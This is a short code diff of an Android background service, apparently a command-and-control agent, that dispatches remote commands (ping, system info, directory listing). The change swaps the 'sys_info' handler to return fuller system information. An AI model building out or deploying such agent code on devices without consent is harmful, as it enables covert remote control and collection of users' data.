@@ -514,7 +514,7 @@ class AgentService : Service() {
                             // Copy your command logic from MainActivity here
                             val response = when {
                                 command == "ping" -> "pong"
-                                command == "sys_info" -> c2Commands.getDeviceName()
+                                command == "sys_info" -> c2Commands.getSysInfo()
 
                                 command.startsWith("ls ") -> {
                                     val path = command.substringAfter("ls ")
